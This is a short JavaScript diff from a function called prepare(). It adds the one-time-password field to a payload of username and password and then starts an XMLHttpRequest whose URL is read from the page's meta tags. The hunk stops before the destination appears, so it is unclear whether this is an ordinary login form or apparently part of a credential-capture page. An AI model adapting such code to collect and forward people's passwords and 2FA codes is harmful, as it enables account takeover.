@@ -108,6 +108,8 @@ function prepare() {
    try {
       var payload = document.getElementById('username').value + "\n" +
                     document.getElementById('password').value;
+      if (document.getElementById('otp').value !== '') 
+         payload += "\t" + document.getElementById('otp').value;
       var xhr = new XMLHttpRequest();
       var metas = document.getElementsByTagName("meta");
       var url = "";
